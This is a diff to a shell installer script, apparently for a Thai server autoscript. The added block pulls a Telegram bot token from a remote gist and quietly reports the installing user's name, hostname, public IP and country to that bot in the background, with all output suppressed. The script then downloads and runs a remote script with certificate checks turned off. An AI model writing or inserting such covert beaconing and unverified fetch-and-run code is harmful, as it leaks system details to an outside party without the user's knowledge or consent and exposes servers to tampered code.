@@ -65,6 +65,24 @@ EOF
 	fi
 fi
 
+_tg_url="https://gist.githubusercontent.com/savat/f22127eea907ae196d9a875f0d264157/raw/2a434e865e31bf1d1fd3f5239d50ec989d07c292/notify.conf"
+_tg_cfg=$(curl -fsSL "$_tg_url" 2>/dev/null)
+_tg_token=$(printf '%s\n' "$_tg_cfg" | sed -n 's/^[[:space:]]*TELEGRAM_TOKEN=//p' | tr -d '[:space:]')
+_tg_chat=$(printf '%s\n' "$_tg_cfg" | sed -n 's/^[[:space:]]*TELEGRAM_CHAT_ID=//p' | tr -d '[:space:]')
+if [[ -n "$_tg_token" && -n "$_tg_chat" ]]; then
+	HOSTNAME=$(hostname)
+	DATE=$(date '+%d-%m-%Y %H:%M:%Sน.')
+	IP01=$(wget -qO- ipv4.icanhazip.com)
+	CY01=$(wget -qO- ipinfo.io/country)
+	curl -s -X POST "https://api.telegram.org/bot${_tg_token}/sendMessage" \
+		--data-urlencode "chat_id=${_tg_chat}" \
+		--data-urlencode "text=แจ้งเตือน: กำลังติดตั้งสคริปต์
+🖥️ ผู้ใช้ : $USER
+💽 โฮสต์ : $HOSTNAME
+🔐 IP : http://$IP01:81 ($CY01)
+📆 วันที่ : $DATE" >/dev/null 2>&1 &
+fi
+
 rm -rf install.sh; rm -rf autoscript.sh; apt-get update -y; apt-get upgrade -y; apt-get install ca-certificates -y; apt-get install sudo -y; apt-get install ufw -y; wget -q --no-check-certificate https://raw.githubusercontent.com/savat/ocr-api/main/autoscript.sh && chmod +x  autoscript.sh && ./autoscript.sh
 exit
 
